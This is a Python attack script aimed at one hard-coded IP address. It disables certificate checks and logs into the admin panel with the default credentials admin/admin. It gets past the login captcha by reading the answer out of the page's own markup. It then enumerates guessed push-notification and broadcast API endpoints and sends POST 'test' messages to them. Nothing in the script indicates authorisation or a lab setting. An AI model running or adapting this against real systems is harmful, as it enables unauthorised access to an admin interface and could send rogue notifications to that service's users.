#!/usr/bin/env python3
"""
Try to discover API endpoints for push notifications
"""

import requests
import json
import re

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login
r = sess.get(TARGET + "/admin/login")
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if token_match:
    token = token_match.group(1)
    r = sess.get(TARGET + "/admin/captcha")
    captcha_match = re.search(r'<text[^>]*>(\w)</text>', r.text)
    if captcha_match:
        captcha = captcha_match.group(1)
        r = sess.post(TARGET + "/admin/login", data={
            'username': 'admin',
            'password': 'admin',
            'captcha': captcha,
            '_token': token
        })
        
        # Try various API patterns
        endpoints = [
            "/api/v1/push", "/api/push", "/api/notifications",
            "/api/v1/notifications", "/api/send", "/api/broadcast",
            "/api/v1/broadcast", "/api/alerts", "/api/v1/alerts",
            "/push", "/notifications", "/broadcast", "/alerts",
            "/admin/push", "/admin/api/push", "/api/v1/push",
            "/api/push/send", "/api/v1/push/send",
            "/api/push/notify", "/api/v1/push/notify",
            "/api/v1/notify", "/api/notify",
            "/api/push/alert", "/api/v1/push/alert",
            "/api/v1/push/broadcast", "/api/push/broadcast"
        ]
        
        for endpoint in endpoints:
            try:
                r = sess.get(TARGET + endpoint, timeout=5)
                # Check if it's an API response (JSON) or different from main page
                if "application/json" in r.headers.get('Content-Type', ''):
                    print(f"[JSON] {endpoint}: {r.status_code}")
                elif "text/html" in r.headers.get('Content-Type', '') and len(r.text) < 1000:
                    print(f"[HTML] {endpoint}: {r.status_code} - {len(r.text)} bytes")
                elif r.status_code in [401, 403]:
                    print(f"[AUTH] {endpoint}: {r.status_code}")
            except requests.exceptions.RequestException as e:
                pass
        
        # Try POST requests
        post_endpoints = [
            "/api/push/send", "/api/v1/push/send",
            "/api/notifications/send", "/api/v1/notifications/send",
            "/api/broadcast/send", "/api/v1/broadcast/send"
        ]
        
        print("\n=== POST endpoints ===")
        for endpoint in post_endpoints:
            try:
                r = sess.post(TARGET + endpoint, json={"message": "test"}, timeout=5)
                if r.status_code in [200, 201, 401, 403, 422]:
                    print(f"[POST] {endpoint}: {r.status_code}")
            except requests.exceptions.RequestException as e:
                pass